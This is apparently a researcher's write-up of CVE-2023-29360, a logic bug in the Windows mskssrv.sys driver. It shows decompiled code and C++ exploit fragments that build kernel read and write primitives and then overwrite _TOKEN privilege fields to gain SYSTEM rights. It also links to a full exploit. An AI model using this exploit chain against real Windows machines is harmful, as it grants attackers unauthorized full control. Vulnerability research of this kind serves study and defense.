# https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360

Bug CVE : CVE-2023â€“29360

Bug type : Logical bug leading to LPE

Integrity needed : Medium for kernel address leak

Tested on : Windows 10

Vulnerable Driver : `mskssrv.sys`

## [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#bug-details)    Bug Details

This is a logical bug arising in function `FsAllocAndLockMdl` inside `mskssrv.sys` driver in windows.

Copy

```
NTSTATUS __fastcall FsAllocAndLockMdl(void *AddressPtr, ULONG Length, struct _MDL **OutputMdl)
{
  NTSTATUS v4; // edi
  struct _MDL *Mdl; // rax
  struct _MDL *v6; // rbx

  v4 = 0;
  if ( !AddressPtr || !Length || !OutputMdl )
    return STATUS_INVALID_PARAMETER;
  Mdl = IoAllocateMdl(AddressPtr, Length, 0, 0, 0i64);
  v6 = Mdl;
  if ( !Mdl )
    return STATUS_INSUFFICIENT_RESOURCES;
  MmProbeAndLockPages(Mdl, KernelMode, IoWriteAccess);
  *OutputMdl = v6;
  return v4;
}
```

This is the vulnerable code snippet that is responsible for the bug. As visible, the function is responsible for creating a `MDL` from the `AddressPtr` which is later passed to `MmProbeAndLockPages`. This probing is done on `KernelMode` rather than being done via `UserMode`. This implies that that we can create a MDL based on arbitrary address and there would be **no validation** done since `KernelMode` is specified.

Looking at the implementation of `MmProbeAndLockPages`,we can confirm this

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FAL9tv93pYrfKSEGnDYEa%252Fimage.png%3Falt%3Dmedia%26token%3D8b57c1a7-577d-4337-8d5f-f8084eb2c99c&width=768&dpr=3&quality=100&sign=49a31ce9&sv=2)

MmProbeAndLockPages

If `AccessMode` is 0, then no check is done since the condition is evaluated to be false. AccessMode is 0 for kernel and 1 for Usermode.

### [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#understanding-mdl)    Understanding MDL

MDL or **Memory Descriptor List** in windows is used by kernel to describe the physical page layout for a Virtual address. MDL is a opaque structure where `StartVa` member points to the Virtual Address associated with the MDL. More details on MDL can be found [herearrow-up-right](https://big5-sec.github.io/posts/CVE-2023-29360-analysis/) and [herearrow-up-right](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls).

Looking at `IoAllocateMdl`, it simply creates a MDL structure on the basis of values passed to it

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FpXARFH9TdYKOWI7EQZcx%252Fimage.png%3Falt%3Dmedia%26token%3Db6b503ef-a889-4f10-acf3-b9b44695eee2&width=768&dpr=3&quality=100&sign=937ec229&sv=2)

IoAllocateMdl

There is no check for `StartVa` member and hence arbitrary virtual address can be passed to it. Next, after the obtaining the MDL structure, the function passes it into `MmProbeAndLockPages` which will lock the MDL's `StartVa` and make sure its not paged out while driver is still operating on the data. Notice that `IoWriteAccess` is supplied to it which means that it allows write operation on the mapped MDL's `StartVa` member.

Now we know can we can create a arbitrary MDL. Lets see what more can be done with the MDL. Looking at xrefs of the MDL, we can see that its only being used inside `FSFrameMdl::MapPages` function.

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FwiWrOkKf4WudCtUNyTDw%252Fimage.png%3Falt%3Dmedia%26token%3D0b7b8971-2549-46e9-9291-0a9d9ba4272d&width=768&dpr=3&quality=100&sign=9f3b1169&sv=2)

this->Mdl1/2 contains the MDL containing the arbitrary StartVa

Looking at `FsMapLockedPages`, we can see that it allows us to map the MDL into the process calling the driver.

Copy

```
NTSTATUS __fastcall FsMapLockedPages(struct _MDL *Mdl, ULONG Priority, PVOID *a3)
{
  NTSTATUS v3; // ebx

  v3 = 0;
  if ( !Mdl || !a3 )
    return STATUS_INVALID_PARAMETER;
  *a3 = 0i64;
  *a3 = MmMapLockedPagesSpecifyCache(Mdl, UserMode, MmCached, 0i64, 0, Priority);
  return v3;
}
```

Looking at MmMapLockedPagesSpecifyCache, we see that the last argument to this function is a ULONG that denotes the Priority. If the priority is MdlMappingNoWrite i.e 0x80000000 , the the Virtual Address pointed by the MDL is mapped as Read Only. This means, that we need to select the right code branch that can allow us a control over Priority as well.

There are 2 code branches possible here.

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252F6vKMk5QmV7cTfR1Z3hLF%252Fimage.png%3Falt%3Dmedia%26token%3D5cf1132f-6361-4fd3-a045-4096758c74de&width=768&dpr=3&quality=100&sign=6cb6feff&sv=2)

Possible Code branches to map MDL's VirtualAddr

For the second branch, the Priority is hardcoded 0xC0000010 which means a Priority flag of MdlMappingNoWrite \| NormalPagePriority \| MdlMappingNoExecute . This implies that we need to select the first branch since the second one is mapped as Read Only.

## [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#exploitation)    Exploitation

Now that we have everything figured, out lets break the exploitation steps into multiple steps :-

### [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#step-1-connecting-to-the-vulnerable-driver)    Step 1 : Connecting to the vulnerable driver

We know that the vulnerable driver is here `mskssrv.sys` but, lets figure out how to connect to the driver.

I was out of idea on this as to how to connect to the driver since it was not working via default connection strings like `\\\\.\\Device\\mskssrv`. Eventually I created a breakpoint on `FSStreamReg::PublishTx` and various other functions. Upon starting the camera, we see that the requests are coming from a DLL called `frameServer.dll` . Lets reverse the DLL to figure out how is it creating the driver handle.

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FzzigGfYsrzRymmFj2Jl8%252Fimage.png%3Falt%3Dmedia%26token%3D63d3ee28-ea14-4c4e-8a31-cd9b58cff95d&width=768&dpr=3&quality=100&sign=97b566f5&sv=2)

frameServer.dll call stack

Reversing the `frameServer.dll` , we see a function called `FSGetMSKSSrvHandle` which creates a call to `CreateFileW` and uses the handle returned by it for further driver communication. Lets create a breakpoint on the same functionality to dump the file parameter passed to CreateFile.

We switch to WindowsCamera.exe process and wait for the breakpoint to be reached.

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FOlLlMCtt8Sg8x7e69fRy%252Fimage.png%3Falt%3Dmedia%26token%3D76483324-5b6c-4319-aaa7-8409ab767ffd&width=768&dpr=3&quality=100&sign=fdc1a02a&sv=2)

lpFileName

Now, that we have the file name, we can now talk to the driver.

Copy

```
bool Driver::SendDataToDriver(int ioctl_code,
                              PVOID buffer,
                              size_t buffer_len,
                              PVOID OutBuffer,
                              size_t out_buffer_len) {

   LPCWSTR lpFileName =
        L"\\\\?\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96E080C7-143C-11D1-B40F-"
        L"00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}";

   HANDLE hDevice = CreateFileW(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL, nullptr);

    NTSTATUS status = -1;
    status = DeviceIoControl(hDevice, ioctl_code, buffer, buffer_len, OutBuffer, out_buffer_len,
                             nullptr, nullptr)
}
```

### [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#step-2-create-globalrendezvous)    Step 2 : Create GlobalRendezvous

To create a MDL, we need to use `PublishTx` function in mskssrv. While reversing the driver, we found that there is a global variable called FSInitializeContextRendezvous that needs to be initialized before anything is executed.

While reversing, we see that there is a global Rendezvous object that is being checked before any operation. So in order to perform any operation, we need to initialize the GlobalRendezvous object.

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FUY1Bjjiublp395hHxSvT%252Fimage.png%3Falt%3Dmedia%26token%3D713870de-fc7d-41b3-8c3c-a45dde080ccd&width=768&dpr=3&quality=100&sign=86e28303&sv=2)

Check for GlobalRendezvous object

The below code would initialize the GlobalRendezvous object.

Copy

```
bool Bug::InitializeGlobalRendezvous() {
    auto* stream_data = static_cast<_FSStreamRegInfo*>(malloc(sizeof(_FSStreamRegInfo)));
    memset(stream_data, 0x0, sizeof(_FSStreamRegInfo));
    HANDLE hEvent = CreateEvent(nullptr, NULL, NULL, nullptr);
    stream_data->ObjectHandle = hEvent;
    stream_data->q2 = GetCurrentProcessId();
    stream_data->q1 = 0x5;
    stream_data->f2 = 0x50;
    stream_data->q5 = 0x20000;
    stream_data->q3 = 1;

    SendDataToDriver(0x2f0400, stream_data, sizeof(_FSStreamRegInfo);
}
```

### [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#step-3-read-primitive)    Step 3 : Read Primitive

The below execution flow is used to create a read primitive.

Copy

```
uint64_t ReadPrimitive(uint64_t where) {
    // Initialize Stream
    bool status = false;
    if (poc::once) {
        poc_.InitializeStream();
    }

    // PublishTx
    status = poc_.PublishTx(where);

    // Register Stream
    if (poc::once) {
        poc_.RegisterStream();
        poc::once = false;
    }

    // ConsumeTx
    poc_.ConsumeTx();

    // DrainTx
    poc_.DrainTx();

    return *reinterpret_cast<uint64_t*>(poc_.GetMappedAddr());
}
```

We first initialize a stream. There would be a single stream binded to a device handle. This implies that we need to execute `InitializeStream` and `RegisterStream` once per device handle. Refer to the exploit code on how to create such requests.

`PublishTx` function is responsible for creating a MDL with arbitrary virtual address while `ConsumeTx` function is responsible for mapping the virtual address stored in the MDL in the user process creating the driver call. Note that we need both `VirtualAddress1` and `VirtualAddress2` for the IOCTL code to work.

Another thing to note here is that we pass `0xffffffff00000008` as the value for the `switch_case` variable. This variable is used to direct the flow to right switch branch along with a controlled value over Priority field for mapping.

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FWLIv0OHRkOJozas4VMVk%252Fimage.png%3Falt%3Dmedia%26token%3Dc51867de-8e12-4f5e-95e3-81c0ab976d23&width=768&dpr=3&quality=100&sign=ee372a70&sv=2)

ConsumeTx

The switch\_case value passed to `PublishTx` is accessed in `ConsumeTx` when the MDL is about to be mapped inside the user address space.

For a value of `0xffffffff00000008`, the switch\_case branches out on the 32 bit LSB which in our case is 8. The priority on other hand is decided by full 64 bit value which after computation becomes `0x40000010` which is OR operation of `MdlMappingNoExecute | NormalPagePriority` which implies that the page is mapped for write operations as well.

Refer to the exploit code on how to create requests for ConsumeTx, PublishTx and DrainTx.

### [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#step-4-write-primitive)    Step 4 : Write Primitive

The below execution flow allows for write primitive :-

Copy

```
void WritePrimitive(uint64_t What, uint64_t Where) {
    // PublishTx
    poc_.PublishTx(Where);

    // ConsumeTx
    poc_.ConsumeTx();

    // DrainTx
    poc_.DrainTx();

    *reinterpret_cast<uint64_t*>(poc_.GetMappedAddr()) = What;
}
```

We don't execute `InitializeStream` and `RegisterStream` since by the time it reaches the Write Primitive, read primitive would be executed first and the mentioned functions would already be executed.

We use the same technique that we used for Read Primitive since the address is mapped with read and write.

### [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#token-structure)    \_TOKEN structure

The token structure contains fields from 0x40 that indicate the privileges associated with the token.

Copy

```
+0x40 Present          : Uint8B
+0x48 Enabled          : Uint8B
+0x50 EnabledByDefault : Uint8B
```

To escalate privileges via write primitive, we can simply overwrite the fields at offset 0x40, 0x48 and 0x50 with the values that are present in the \_TOKEN of system process.

Note : The \_TOKEN address obtained via any means should have the last bit set to 0. So simply AND the address with `0xfffffffffffffff0`

### [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#time-wasted-on)    Time wasted on :-

The below are the pointers where I wasted lot of time on silly mistakes.

- While reversing, I figured out that we need to execute both `InitializeStream` and `RegisterStream` functions but I was not able to execute both the functions on a single driver handle. This lead me to realize that we need 2 driver handles. One driver handle would be responsible for creating `InitializeStream` and another one would be responsible for creating `RegisterStream`. If our main driver handle is say `driver1_` , then InitializeStream needs to be done on handle1\_ while RegisterStream needs to be done on driver2\_.


The reason for this is because of a check in ConsumeTx shown below :

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FO71YlZMG5Xl9mX77KwIt%252Fimage.png%3Falt%3Dmedia%26token%3D81b0296e-fb35-4d50-8ce0-c5c3b0798b6a&width=768&dpr=3&quality=100&sign=b1d054c4&sv=2)

Make sure stream is registered

The variable g4 is initialized to 1 only in `RegisterStream` function in mskssrv driver. As shown below, the driver fetches the stream pointer from a list and sets `g4` structure member to 1

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FGhTKPNufPdVoZ6Qaph1e%252Fimage.png%3Falt%3Dmedia%26token%3Da22d4e05-56b7-4f43-a74c-80eca15f9f01&width=768&dpr=3&quality=100&sign=be727f7f&sv=2)

Register stream

The reason we were not able to use the same driver handle is because of this check in RegisterStream operation

Copy

```
 ...
  if ( CurrentStackLocation->Parameters.DeviceIoControl.IoControlCode != 0x2F0420
    || CurrentStackLocation->FileObject->FsContext2 )
  {
    return STATUS_INVALID_DEVICE_REQUEST;
  }
  ...
```

The FsContext2 is set for a IRP that corresponds to a single driver handle. This means that if we create a new driver handle, then `FsContext2` by default will be null and this check would be passed and hence the need to create a new driver handle.

- Given the read write primitives, I wanted to use less number of read and writes. This means that traversing the eprocess linked list in kernel is not a feasible approach since this would be multiple reads. Reading about few techniques, I found this [blackhatarrow-up-right](http://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf) paper.


I decided to use the `OpenProcessToken` approach. OpenProcessToken returns a token handle that can be used along with `NtQuerySystemInformation` to obtain the kernel address of the \_TOKEN object. I wasted lot of time trying to understand why the Token address returned via above method was not same to the token address obtained via `_EPROCESS` structure from debugger.

Eventually I realized that I was looking at wrong process. The exploit process would be a child process of cmd.exe and as such we need to find the `_EPROCESS` of the exploit process rather than cmd.exe and then calculate the value. The Token address returned via \_EPROCESS would be same as the one obtained via previous method. A stupid mistake ðŸ˜„

Full exploit can be found at [Githubarrow-up-right](https://github.com/0xDivyanshu-new/CVE-2023-29360/).

### [hashtag](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360\#references)    References :-

- BlackHat paper on methods for token based privilge escalation : [herearrow-up-right](http://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf)

- A awesome blog on the bug by yar-eb [herearrow-up-right](https://big5-sec.github.io/posts/CVE-2023-29360-analysis/)

- Theori blog for a detailed analysis [herearrow-up-right](https://blog.theori.io/chaining-n-days-to-compromise-all-part-3-windows-driver-lpe-medium-to-system-12f7821d97bb).


[PreviousMouse Serverchevron-left](https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mouse-server) [NextFuzzingchevron-right](https://seg-fault.gitbook.io/researchs/windows-security-research/fuzzing)

Last updated 1 year ago